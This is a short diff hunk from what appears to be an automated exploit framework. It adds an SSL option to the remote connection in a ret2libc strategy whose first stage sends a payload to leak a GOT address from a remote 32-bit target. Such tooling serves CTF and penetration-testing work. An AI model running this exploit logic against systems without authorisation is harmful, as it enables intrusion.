@@ -189,7 +189,7 @@ class Ret2LibcWriteX32RemoteStrategy(ExploitStrategy):
             print_info("ret2libc-write-x32-remote stage1 primitive returned empty; skipping")
             return False
 
-        io = remote(host, port)
+        io = remote(host, port, ssl=ctx.ssl)  # v4.1.11
         io.recv()
         io.sendline(payload1)
         print_payload("stage 1: leaking write address from GOT")
